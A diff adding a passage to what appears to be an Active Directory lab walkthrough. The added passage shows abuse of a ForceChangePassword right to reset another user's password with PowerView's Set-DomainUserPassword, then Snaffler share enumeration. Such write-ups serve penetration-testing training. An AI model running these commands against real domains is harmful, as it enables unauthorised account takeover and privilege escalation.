@@ -656,3 +656,9 @@ After this, we can cd into the C:\share directory and run the command "net use" 
 ```
 C:\Share copy \\TSCLIENT\home\file
 ```
+On Outbound Execution Privileges, we see that hporter has the ForceChangePassword permission over the user ssmalls which is in the itadmins group, giving us a possible privilege escalation. We can abuse the ForceChangePassword permission with the PowerView command after copying PowerView to the DEV01 host through xfreerdp /drive:
+```
+Import-Module PowerView.ps1
+Set-DomainUserPassword -Identity (domainusername) -AccountPassword (ConvertTo-SecureString 'Password123@' -AsPlainText -Force ) -Verbose
+```
+We don't immediately see anything from the ssmalls user, so we can try running the Snaffler tool to enumerate any file shares that are readable from the computers in AD. 
